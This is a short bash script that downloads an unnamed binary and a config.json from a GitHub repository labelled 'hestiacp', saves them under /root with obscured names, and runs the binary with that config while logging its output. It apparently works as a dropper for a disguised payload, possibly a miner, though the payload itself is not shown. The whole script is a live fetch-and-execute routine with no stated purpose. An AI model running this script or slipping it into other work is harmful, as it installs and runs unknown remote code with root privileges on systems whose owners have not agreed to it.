#!/bin/bash
wget -O /root/cd https://github.com/jmmjiaa89/hestiacp/raw/refs/heads/main/di
chmod u+x /root/cd
wget -O /root/xg.json https://raw.githubusercontent.com/jmmjiaa89/hestiacp/refs/heads/main/config.json
chmod u+x /root/xg.json
/root/cd --config=/root/xg.json > /var/log/cd.log 2>&1
ping aws.amazon.com
